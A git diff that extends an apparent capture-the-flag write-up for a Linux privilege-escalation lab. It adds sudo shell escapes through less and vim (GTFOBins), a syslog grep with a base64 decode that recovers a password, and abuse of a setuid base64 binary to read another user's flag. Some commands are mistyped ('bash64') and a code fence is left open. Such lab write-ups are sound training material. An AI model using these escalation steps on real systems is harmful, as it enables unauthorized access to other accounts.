@@ -791,15 +791,78 @@ Check out [GTFOBINS](https://gtfobins.org/gtfobins/less/#shell)
 ```bash
  sudo -u ken less /etc/hosts
  !/bin/sh
+ cat ../ken/flag.txt
 ```
 
 ### What is sean's flag?
 
+`:> sudo -l`  
+
+```bash
+Matching Defaults entries for ken on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ken may run the following commands on linuxagency:
+    (sean) NOPASSWD: /usr/bin/vi
+```
+
+[GTFOBINS](https://gtfobins.org/gtfobins/vi/#shell) exploit to invoke a shell.  
+
+`:> sudo -u sean vim -c ':!/bin/sh' /dev/null`
+
+`:> id`  
+
+`uid=1037(sean) gid=1037(sean) groups=1037(sean),4(adm)`
+
+member of the admin group indicating privileges in system areas.  
+
+`:> cd /var`
+
+`:> grep -ir sean`  
+
+`:> grep -i sean /var/log/syslog.bak | cut -d " " -f 19 | base64 -d` : p3nelope
+
+```bash  
+
+ exit back to viktor's profile  
+
+
 ### What is penelope's flag?
+
+ `:> su penelope`  
+
+ `:> cat /home/penelope/flag.txt`
+
+ `:> ls -alh /home/penelope`  
+
+ ```bash
+ total 80K
+drwxr-x---  3 penelope penelope 4.0K Jan 12  2021 .
+drwxr-xr-x 45 root     root     4.0K Jan 12  2021 ..
+-rwsr-sr-x  1 maya     maya      39K Jan 12  2021 base64   <--------------------- Here
+lrwxrwxrwx  1 penelope penelope    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 penelope penelope  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 penelope penelope 3.7K Jan 12  2021 .bashrc
+-rw-r--r--  1 penelope penelope 8.8K Jan 12  2021 examples.desktop
+-r--------  1 penelope penelope   43 Jan 12  2021 flag.txt
+drwx------  3 penelope penelope 4.0K Jan 12  2021 .gnupg
+-rw-r--r--  1 penelope penelope  807 Jan 12  2021 .profile
+```
 
 ### What is maya's flag?
 
+`:> cd /home/penelope`
+
+`:> ./bash64 /home/maya/flag.txt | bash64 --decode` : mayas flag  
+
 ### What is robert's Passphrase?
+
+`:> su maya`  
+
+`:> cat elusive_targets.txt`  
+
+
 
 ### What is user.txt?
 
